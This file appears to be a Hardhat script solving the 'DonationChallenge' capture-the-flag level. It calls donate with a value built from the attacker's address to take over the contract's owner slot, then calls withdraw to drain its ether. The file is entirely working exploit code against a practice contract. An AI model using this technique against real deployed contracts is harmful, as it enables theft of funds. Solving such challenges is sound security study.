import { ethers } from 'hardhat';
const { utils, BigNumber } = ethers;

const address = '0x6ACD922765567f1936eFec844ea1CA9f3FCD4b06';

async function main() {
  const targetFactory = await ethers.getContractFactory('DonationChallenge');
  const target = await targetFactory.attach(address);
  await target.deployed();

  console.log('Target deployed to:', target.address);

  const [attacker] = await ethers.getSigners();

  const scale = BigNumber.from(10).pow(18).mul(utils.parseEther('1'));
  const attackerAddressNumber = BigNumber.from(attacker.address);
  const etherToSend = attackerAddressNumber.div(scale);

  let tx;

  console.log('1 - Donating');
  tx = await target.connect(attacker).donate(attackerAddressNumber, {
    value: etherToSend,
  });
  await tx.wait();

  console.log('2 - Withdrawing');
  tx = await target.connect(attacker).withdraw();
  await tx.wait();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
